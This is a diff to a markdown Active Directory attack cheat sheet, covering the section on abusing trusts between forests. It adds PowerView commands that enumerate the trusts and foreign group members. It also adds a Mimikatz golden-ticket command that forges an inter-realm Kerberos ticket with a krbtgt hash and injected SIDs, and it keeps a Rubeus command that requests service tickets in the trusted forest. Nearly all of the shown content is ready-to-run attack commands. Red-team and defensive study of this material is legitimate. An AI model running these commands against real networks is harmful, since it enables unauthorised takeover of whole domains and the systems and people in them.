@@ -998,15 +998,29 @@ This gives us the NTLM hash of the Root Domain Administrator account and access 
 * * *
 
 #### Across Forests - Inter-Forest Trust
+
+```Get-DomainTrustMapping```
+```Get-DomainUser -Domain externalnet.com```
+```Get-DomainForeignGroupMember -Domain externalnet.com```
+
 There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts. Other than that it is the same:
 
 ```
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:external.local /ticket:C:\Temp\trust_forest_tkt.kirbi"'
 ```
 
- We can then request a TGS for any service located within the External Forest having established trust:
+We can then request a TGS for any service located within the External Forest having established trust:
 
 ```.\Rubeus asktgs C:\Temp\trust_forest_tkt.kirbi CIFS/dc01.external.local```
+
+
+
+Or find the RID via - ```Get-DomainGroupMember -Identity "Administrators" -Domain externalnet.com```
+
+```
+kerberos::golden /user:adminz /domain:externalnet.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:cd3fb1b0b49c7a56d285ffdbb1304431 /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt
+```
+
 
 * * *
 
